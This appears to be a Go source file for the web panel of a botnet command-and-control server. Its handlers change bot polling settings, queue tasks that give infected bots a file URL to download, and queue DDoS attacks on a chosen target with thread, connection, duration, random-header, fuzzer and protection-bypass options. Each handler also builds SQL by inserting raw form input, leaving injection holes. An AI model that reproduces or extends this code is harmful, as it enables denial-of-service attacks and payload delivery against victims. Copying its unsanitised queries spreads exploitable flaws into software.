package main

import (
	"database/sql"
	"fmt"
	"github.com/gin-gonic/gin"
	"strconv"
)

func setVariables(c *gin.Context) {
	interval := c.PostForm("interval")
	deadAfter := c.PostForm("deadAfter")
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	query := fmt.Sprintf("UPDATE setting SET interval=\"%s\", dead_after=\"%s\"", interval, deadAfter)
	_, err = db.Exec(query)
	if err != nil {
		fmt.Println(err)
	}
	c.Redirect(302, "/setting")
}

func createTask(c *gin.Context) {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	var fileURL, botCount string
	botCount = c.PostForm("botCount")
	var botCountInt int
	if botCount == "" {
		_, botCountInt, _, _, _ = renderBots()
		botCount = strconv.Itoa(botCountInt)
	}
	fileURL = c.PostForm("fileURL")
	query := fmt.Sprintf("INSERT INTO task VALUES (NULL, \"%s\", %s)", fileURL, botCount)
	_, err = db.Exec(query)
	if err != nil {
		fmt.Println(err)
	}
	c.Redirect(302, "/task.new")
}

func createAttack(c *gin.Context) {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	attackType := c.PostForm("attackType")
	attackTarget := c.PostForm("target")
	thread := c.PostForm("thread")
	connection := c.PostForm("connection")
	duration := c.PostForm("duration")
	interval := c.PostForm("interval")
	method := c.PostForm("method")
	randomHeader := c.PostForm("randomHeader")
	fuzzer := c.PostForm("useFuzzer")
	protection := c.PostForm("protection")
	cookieDuration := c.PostForm("cookieDuration")
	if cookieDuration == "" {
		cookieDuration = "5"
	}
	botCount := c.PostForm("botCount")
	var botCountInt int
	if botCount == "" {
		_, botCountInt, _, _, _ = renderBots()
		botCount = strconv.Itoa(botCountInt)
	}
	query := fmt.Sprintf("INSERT INTO attack VALUES (NULL, \"%s\", \"%s\", %s, %s, %s, %s, \"%s\", %s, %s, %s, %s, %s)", attackType, attackTarget, thread, connection, duration, interval, method, randomHeader, fuzzer, protection, cookieDuration, botCount)
	_, err = db.Exec(query)
	if err != nil {
		fmt.Println(err)
	}
	c.Redirect(302, "/attack.new")
}